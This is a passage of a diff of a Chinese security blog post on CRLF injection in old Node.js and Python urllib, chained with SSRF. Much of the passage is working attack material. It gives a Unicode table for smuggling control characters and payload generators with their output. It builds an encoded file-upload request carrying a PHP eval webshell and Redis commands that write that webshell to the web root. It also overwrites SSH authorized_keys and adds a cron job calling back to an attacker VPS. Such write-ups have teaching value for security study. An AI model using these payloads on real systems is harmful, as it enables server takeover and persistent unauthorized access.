 <p>当 Node.js v8 或更低版本对此URL发出 <code>GET</code> 请求时，它不会进行编码转义，因为它们不是HTTP控制字符：</p>
 <pre><code class="highlight js">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.111.141.135:9999/\u010D\u010A/WHOAMI&#x27;</span>).<span class="property">output</span>
 [ <span class="string">&#x27;GET /čĊ/WHOAMI HTTP/1.1\r\nHost: 47.111.141.135:9999\r\nConnection: close\r\n\r\n&#x27;</span> ]</code></pre>
-
 <p>但是当结果字符串被编码为 latin1 写入路径时，这些字符将分别被截断为 “\r”（%0d）和 “\n”（%0a）：</p>
 <p><img src="https://p4.ssl.qhimg.com/t01820e6d889f5f8892.png" alt="img"></p>
 <p>但是这在我的版本中已经没有了，无论是<code>\u&#123;010D&#125;\u&#123;010A&#125;</code>还是<code>\u010D\u010A</code>在HTTP请求中都会被解码</p>
 <p>而在</p>
 <pre><code class="highlight plaintext">Buffer.from(&#x27;http://47.111.141.135:9999/\u&#123;010D&#125;\u&#123;010A&#125;/WHOAMI&#x27;, &#x27;latin1&#x27;).toString()</code></pre>
-
 <p>是可以被转义出来的</p>
 <p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250714181611956.png" alt="image-20250714181611956"></p>
 <p>目前原因未知啊。。感觉是这个已经在高版本中被修复了，被http制裁了。。</p>
-<p>那么就要收集一下这个<strong>最后适用的版本</strong>了(回头再找吧我是懒狗。。)，但是还是记录一下这些古早版本的神必漏洞吧<del>八旬漏洞会遇到白发机子吗</del></p>
+<p>那么就要收集一下这个<strong>最后适用的版本</strong>了(回头再找吧我是懒狗。。)，但是还是记录一下这些古早版本的神必漏洞吧<s>八旬漏洞会遇到白发机子吗</s></p>
 <p>可见，通过在请求路径中包含精心选择的Unicode字符，攻击者可以欺骗Node.js并成功实现CRLF注入。</p>
 <p>不仅是CRLF，所有的控制字符都可以通过这个构造出来。下面是我列举出来的表格，第一列是需要构造的字符，第二列是可构造出相应字符的高编号的Unicode码，第三列是高编号的Unicode码对应的字符，第四列是高编号的Unicode码对应的字符的URL编码：</p>
 <table>
 <thead>
 <tr>
-<th align="center">字符</th>
-<th align="center">可由以下Unicode编码构造出</th>
-<th align="center">Unicode编码对应的字符</th>
-<th align="center">Unicode编码对应的字符对应的URL编码</th>
+<th style="text-align:center">字符</th>
+<th style="text-align:center">可由以下Unicode编码构造出</th>
+<th style="text-align:center">Unicode编码对应的字符</th>
+<th style="text-align:center">Unicode编码对应的字符对应的URL编码</th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center">回车符 \r</td>
-<td align="center">\u010d</td>
-<td align="center">č</td>
-<td align="center">%C4%8D</td>
+<tbody>
+<tr>
+<td style="text-align:center">回车符 \r</td>
+<td style="text-align:center">\u010d</td>
+<td style="text-align:center">č</td>
+<td style="text-align:center">%C4%8D</td>
 </tr>
 <tr>
-<td align="center">换行符 \n</td>
-<td align="center">\u010a</td>
-<td align="center">Ċ</td>
-<td align="center">%C4%8A</td>
+<td style="text-align:center">换行符 \n</td>
+<td style="text-align:center">\u010a</td>
+<td style="text-align:center">Ċ</td>
+<td style="text-align:center">%C4%8A</td>
 </tr>
 <tr>
-<td align="center">空格</td>
-<td align="center">\u0120</td>
-<td align="center">Ġ</td>
-<td align="center">%C4%A0</td>
+<td style="text-align:center">空格</td>
+<td style="text-align:center">\u0120</td>
+<td style="text-align:center">Ġ</td>
+<td style="text-align:center">%C4%A0</td>
 </tr>
 <tr>
-<td align="center">反斜杠 \</td>
-<td align="center">\u0122</td>
-<td align="center">Ģ</td>
-<td align="center">%C4%A2</td>
+<td style="text-align:center">反斜杠 \</td>
+<td style="text-align:center">\u0122</td>
+<td style="text-align:center">Ģ</td>
+<td style="text-align:center">%C4%A2</td>
 </tr>
 <tr>
-<td align="center">单引号 ‘</td>
-<td align="center">\u0127</td>
-<td align="center">ħ</td>
-<td align="center">%C4%A7</td>
+<td style="text-align:center">单引号 ‘</td>
+<td style="text-align:center">\u0127</td>
+<td style="text-align:center">ħ</td>
+<td style="text-align:center">%C4%A7</td>
 </tr>
 <tr>
-<td align="center">反引号 &#96;</td>
-<td align="center">\u0160</td>
-<td align="center">Š</td>
-<td align="center">%C5%A0</td>
+<td style="text-align:center">反引号 `</td>
+<td style="text-align:center">\u0160</td>
+<td style="text-align:center">Š</td>
+<td style="text-align:center">%C5%A0</td>
 </tr>
 <tr>
-<td align="center">叹号 !</td>
-<td align="center">\u0121</td>
-<td align="center">ġ</td>
-<td align="center">%C4%A1</td>
+<td style="text-align:center">叹号 !</td>
+<td style="text-align:center">\u0121</td>
+<td style="text-align:center">ġ</td>
+<td style="text-align:center">%C4%A1</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>这个bug已经在Node.js10中被修复，如果请求路径包含非Ascii字符，则会抛出错误。但是对于 Node.js v8 或更低版本，如果有下列情况，任何发出HTTP请求的服务器都可能受到通过请求拆实现的SSRF的攻击：</p>
 <ul>
 <li>接受来自用户输入的Unicode数据</li>
 <li>并将其包含在HTTP请求的路径中</li>
 <li>且请求具有一个0长度的主体（比如一个 <code>GET</code> 或者 <code>DELETE</code>)</li>
 </ul>
-<h3 id="在-HTTP-状态行注入恶意首部字段-1"><a href="#在-HTTP-状态行注入恶意首部字段-1" class="headerlink" title="在 HTTP 状态行注入恶意首部字段"></a>在 HTTP 状态行注入恶意首部字段</h3><p>由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入恶意的 HTTP 首部字段的话还需要闭合状态行中 <code>HTTP/1.1</code> ，即保证注入后有正常的 HTTP 状态行：</p>
+<h3 id="在-http-状态行注入恶意首部字段-2"><a class="markdownIt-Anchor" href="#在-http-状态行注入恶意首部字段-2"></a> 在 HTTP 状态行注入恶意首部字段</h3>
+<p>由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入恶意的 HTTP 首部字段的话还需要闭合状态行中 <code>HTTP/1.1</code> ，即保证注入后有正常的 HTTP 状态行：</p>
 <pre><code class="highlight js">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami&#x27;</span>).<span class="property">output</span>
 [ <span class="string">&#x27;GET /ĠHTTP/1.1čĊSet-Cookie:ĠPHPSESSID=whoami HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</code></pre>
-
 <p><img src="https://p4.ssl.qhimg.com/t01833dd0e566e383b1.png" alt="img"></p>
 <p>如上图所示，成功构造出了一个 Set-Cookie 首部字段，虽然后面还有一个 <code>HTTP/1.1</code> ，但我们根据该原理依然可以将其闭合：</p>
 <pre><code class="highlight js">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami\u010D\u010Atest:&#x27;</span>).<span class="property">output</span>
 [ <span class="string">&#x27;GET /ĠHTTP/1.1čĊSet-Cookie:ĠPHPSESSID=whoamičĊtest: HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</code></pre>
-
 <p><img src="https://p5.ssl.qhimg.com/t0196c013fcb593f5dc.png" alt="img"></p>
 <p>这样，我们便可以构造 “任意” 的HTTP请求了。</p>
-<h3 id="在-HTTP-状态行注入完整-HTTP-请求-1"><a href="#在-HTTP-状态行注入完整-HTTP-请求-1" class="headerlink" title="在 HTTP 状态行注入完整 HTTP 请求"></a>在 HTTP 状态行注入完整 HTTP 请求</h3><p>首先，由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入完整的 HTTP 请求的话需要先闭合状态行中 <code>HTTP/1.1</code> ，即保证注入后有正常的 HTTP 状态行。其次为了不让原来的 <code>HTTP/1.1</code> 影响我们新构造的请求，我们还需要再构造一次 <code>GET /</code> 闭合原来的 HTTP 请求。</p>
+<h3 id="在-http-状态行注入完整-http-请求-2"><a class="markdownIt-Anchor" href="#在-http-状态行注入完整-http-请求-2"></a> 在 HTTP 状态行注入完整 HTTP 请求</h3>
+<p>首先，由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入完整的 HTTP 请求的话需要先闭合状态行中 <code>HTTP/1.1</code> ，即保证注入后有正常的 HTTP 状态行。其次为了不让原来的 <code>HTTP/1.1</code> 影响我们新构造的请求，我们还需要再构造一次 <code>GET /</code> 闭合原来的 HTTP 请求。</p>
 <p>假设目标主机存在SSRF，需要我们在目标主机本地上传文件。我们需要尝试构造如下这个文件上传的完整 POST 请求：</p>
 <pre><code class="highlight http"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span>
 <span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1
@@ -647,7 +767,6 @@ Connection: keep-alive</code></pre>
 <span class="language-php"></span>
 <span class="language-php">Upload</span>
 <span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></code></pre>
-
 <p>为了方便，我们将这个POST请求里面的所有的字符包括控制符全部用上述的高编号Unicode码表示：</p>
 <pre><code class="highlight python">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span>
 <span class="string"></span>
@@ -690,16 +809,13 @@ payload = payload_encode(payload)
 <span class="built_in">print</span>(payload)
 
 <span class="comment"># 输出: ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ</span></code></pre>
-
 <p>构造请求：</p>
 <pre><code class="highlight php">&gt; http.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ&#x27;</span>)</code></pre>
-
 <p><img src="https://p0.ssl.qhimg.com/t01aac9eb365660564a.png" alt="img"></p>
 <p>如上图所示，成功构造出了一个文件上传的POST请求，像这样的POST请求可以被我们用于 SSRF。下面我们分析一下整个攻击的过程。</p>
 <p>原始请求数据如下：</p>
 <pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
 <span class="attribute">Host</span><span class="punctuation">: </span>47.101.57.72:4000</code></pre>
-
 <p>当我们插入CRLF数据后，HTTP请求数据变成了：</p>
 <pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
 
@@ -717,7 +833,6 @@ payload = payload_encode(payload)
 <span class="language-php"></span>
 <span class="language-php"> HTTP/<span class="number">1.1</span></span>
 <span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></code></pre>
-
 <p>上次请求包的Host字段和状态行中的 <code>HTTP/1.1</code> 就单独出来了，所以我们再构造一个请求把他闭合：</p>
 <pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
 
@@ -736,25 +851,24 @@ payload = payload_encode(payload)
 <span class="language-php">GET / HTTP/<span class="number">1.1</span></span>
 <span class="language-php">test: HTTP/<span class="number">1.1</span></span>
 <span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></code></pre>
-
-<h2 id="CRLF-SSRF-攻击内网应用"><a href="#CRLF-SSRF-攻击内网应用" class="headerlink" title="CRLF + SSRF 攻击内网应用"></a>CRLF + SSRF 攻击内网应用</h2><p>在SSRF中我们经常使用 Gopher 协议去攻击内网应用，比如Redis、MySQL、FTP等。但是当 Gopher 协议被过滤了之后，我们还可以通过HTTP协议并配合CRLF漏洞进行攻击，达到与 Gopher 协议一样的效果。</p>
-<h3 id="攻击-Redis"><a href="#攻击-Redis" class="headerlink" title="攻击 Redis"></a>攻击 Redis</h3><p>实验环境：</p>
+<h2 id="crlf-ssrf-攻击内网应用"><a class="markdownIt-Anchor" href="#crlf-ssrf-攻击内网应用"></a> CRLF + SSRF 攻击内网应用</h2>
+<p>在SSRF中我们经常使用 Gopher 协议去攻击内网应用，比如Redis、MySQL、FTP等。但是当 Gopher 协议被过滤了之后，我们还可以通过HTTP协议并配合CRLF漏洞进行攻击，达到与 Gopher 协议一样的效果。</p>
+<h3 id="攻击-redis"><a class="markdownIt-Anchor" href="#攻击-redis"></a> 攻击 Redis</h3>
+<p>实验环境：</p>
 <p><img src="https://p3.ssl.qhimg.com/t0131e105fae41b3683.png" alt="img"></p>
 <p>访问目标Web服务器是一个Flask应用，可以通过传递url参数进行 SSRF：</p>
 <p><img src="https://p3.ssl.qhimg.com/t010ad518fe0047f40f.png" alt="img"></p>
 <p>经测试，目标主机6379端口上运行有Redis服务且只能在本地访问，但是目标服务器过滤了 Gopher 协议，要想攻击 Redis 的话还需要想别的办法。</p>
 <p>首先让目标机访问我们的 VPS：</p>
 <pre><code class="highlight python">/?url=http://<span class="number">47.101</span><span class="number">.57</span><span class="number">.72</span>:<span class="number">4000</span></code></pre>
-
 <p><img src="https://p4.ssl.qhimg.com/t01de6686f7292b3fcb.png" alt="img"></p>
-<p>如上图所示，发现目标Web存在Python-urllib&#x2F;3.7，该版本的Urllib存在CRLF注入漏洞，所以我们的思路是通过HTTP协议配合CRLF漏洞攻击Redis。</p>
+<p>如上图所示，发现目标Web存在Python-urllib/3.7，该版本的Urllib存在CRLF注入漏洞，所以我们的思路是通过HTTP协议配合CRLF漏洞攻击Redis。</p>
 <p>这里我们只演示通过 Redis 写 Webshell，需要执行的 Redis 命令如下：</p>
 <pre><code class="highlight python">flushall
 config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/
 config <span class="built_in">set</span> dbfilename shell.php
 <span class="built_in">set</span> x <span class="string">&#x27;&lt;?php eval($_POST[whoami]);?&gt;&#x27;</span>
 save</code></pre>
-
 <p>然后要做的就是使用 HTTP 协议配合 CRLF 将这些命令构造成 TCP Stream 并通过 SSRF 发送给目标服务器。</p>
 <p>编写脚本构造 payload：</p>
 <pre><code class="highlight python"><span class="keyword">import</span> urllib.parse
@@ -772,14 +886,11 @@ payload = <span class="string">&quot;?url=http://127.0.0.1:6379/&quot;</span> + 
 <span class="built_in">print</span>(payload)
 
 <span class="comment"># 输出: ?url=http://127.0.0.1:6379/%20HTTP/1.1%0D%0A%0D%0Aflushall%0D%0Aconfig%20set%20dir%20/var/www/html/%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Aset%20x%20%27%3C%3Fphp%20eval%28%24_POST%5Bwhoami%5D%29%3B%3F%3E%27%0D%0Asave%0D%0Atest%3A%20</span></code></pre>
-
 <p>我们现在自己 VPS 上测试一下：</p>
 <pre><code class="highlight python">?url=http://<span class="number">47.101</span><span class="number">.57</span><span class="number">.72</span>:<span class="number">6379</span>/%20HTTP/<span class="number">1.1</span>%0D%0A%0D%0Aflushall%0D%0Aconfig%20<span class="built_in">set</span>%20<span class="built_in">dir</span>%<span class="number">20</span>/var/www/html/%0D%0Aconfig%20<span class="built_in">set</span>%20dbfilename%20shell.php%0D%0Aset%20x%<span class="number">20</span>%<span class="number">27</span>%3C%3Fphp%20<span class="built_in">eval</span>%<span class="number">28</span>%24_POST%5Bwhoami%5D%<span class="number">29</span>%3B%3F%3E%<span class="number">27</span>%0D%0Asave%0D%0Atest%3A%<span class="number">20</span></code></pre>
-
 <p><img src="https://p5.ssl.qhimg.com/t012736c55bfe08049f.png" alt="img"></p>
 <p>如上图所示，成功发送出了 Redis 命令。下面开始正式攻击：</p>
 <pre><code class="highlight python">/?url=http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>/%20HTTP/<span class="number">1.1</span>%0D%0Aflushall%0D%0Aconfig%20<span class="built_in">set</span>%20<span class="built_in">dir</span>%<span class="number">20</span>/var/www/html/%0D%0Aconfig%20<span class="built_in">set</span>%20dbfilename%20shell.php%0D%0Aset%20x%<span class="number">20</span>%<span class="number">27</span>%3C%3Fphp%20<span class="built_in">eval</span>%<span class="number">28</span>%24_POST%5Bwhoami%5D%<span class="number">29</span>%3B%3F%3E%<span class="number">27</span>%0D%0Asave%0D%0Atest%3A%<span class="number">20</span></code></pre>
-
 <p>执行后，成功通过Redis在目标主机的Web目录里面写入了Webshell：</p>
 <p><img src="https://p0.ssl.qhimg.com/t01a5cac758fd4e71af.png" alt="img"></p>
 <p>蚁剑连接成功：</p>
@@ -794,7 +905,6 @@ payload = <span class="string">&quot;?url=http://127.0.0.1:6379/&quot;</span> + 
 config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/
 config <span class="built_in">set</span> dbfilename authorized_keys
 save</code></pre>
-
 <ul>
 <li>创建计划任务</li>
 </ul>
@@ -805,73 +915,130 @@ config <span class="built_in">set</span> dbfilename root
 save
 
 // <span class="number">47.</span>xxx.xxx<span class="number">.72</span>为攻击者vps的IP</code></pre>
-
 <p>构造 payload 的方法与写 Webshell 的方法是一样的，请自行尝试。</p>
-<h3 id="攻击-MySQL"><a href="#攻击-MySQL" class="headerlink" title="攻击 MySQL"></a>攻击 MySQL</h3><p>坑。。。</p>
-<h3 id="攻击FTP"><a href="#攻击FTP" class="headerlink" title="攻击FTP"></a>攻击FTP</h3><p>鉴于我还没接触过FTP，先搁置了。。</p>
+<h3 id="攻击-mysql"><a class="markdownIt-Anchor" href="#攻击-mysql"></a> 攻击 MySQL</h3>
+<p>坑。。。</p>
+<h3 id="攻击ftp"><a class="markdownIt-Anchor" href="#攻击ftp"></a> 攻击FTP</h3>
+<p>鉴于我还没接触过FTP，先搁置了。。</p>
 <p>感觉最近接触到的对于HTTP报文的漏洞越来越多了，感觉需要重新好好了解一下HTTP协议了(之前只是为了做题，在入门的时候从来没有思考过去深入了解HTTP协议内部的机制。。</p>
 <p>最后再感概一句，CRLF的黄金日子已经过去了唉唉，现在只能在其他攻击里面看到它的影子，这算不算一种时代的眼泪呢。。</p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://ayan0.top">AyaN0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ayan0.top/2025/07/14/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">https://ayan0.top/2025/07/14/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://ayan0.top" target="_blank">Blog of AyaN0</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web-HTTP/">-Web -HTTP</a></div><div class="post-share"><div class="social-share" data-image="/img/ari.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ari.webp" onerror="this.onerror=null;this.src='/img/dacapo.gif'" alt="avatar"/></div><div class="author-info-name">AyaN0</div><div class="author-info-description">”如果是你的话，是否会选择继续前进呢"</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/kisakiayano" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1594453512@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客喵</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">CRLF注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CRLF%E6%98%AF%E6%80%8E%E4%B9%88%E9%80%A0%E6%88%90%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%91%A2"><span class="toc-text">CRLF是怎么造成漏洞的呢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Location%E5%AD%97%E6%AE%B5%E7%9A%84302%E8%B7%B3%E8%BD%AC"><span class="toc-text">Location字段的302跳转</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-fsockopen-%E5%87%BD%E6%95%B0"><span class="toc-text">PHP fsockopen() 函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8Host%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5"><span class="toc-text">在Host头部注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-SoapClient-%E7%B1%BB"><span class="toc-text">PHP SoapClient 类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8-User-Agent-%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5"><span class="toc-text">在 User-Agent 头部注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E9%80%81-POST-%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-text">发送 POST 数据包</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-urllib-CRLF-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-9740%EF%BC%89"><span class="toc-text">Python urllib CRLF 注入漏洞（CVE-2019-9740）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8-HTTP-%E7%8A%B6%E6%80%81%E8%A1%8C%E6%B3%A8%E5%85%A5%E6%81%B6%E6%84%8F%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5"><span class="toc-text">在 HTTP 状态行注入恶意首部字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8-HTTP-%E7%8A%B6%E6%80%81%E8%A1%8C%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4-HTTP-%E8%AF%B7%E6%B1%82"><span class="toc-text">在 HTTP 状态行注入完整 HTTP 请求</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 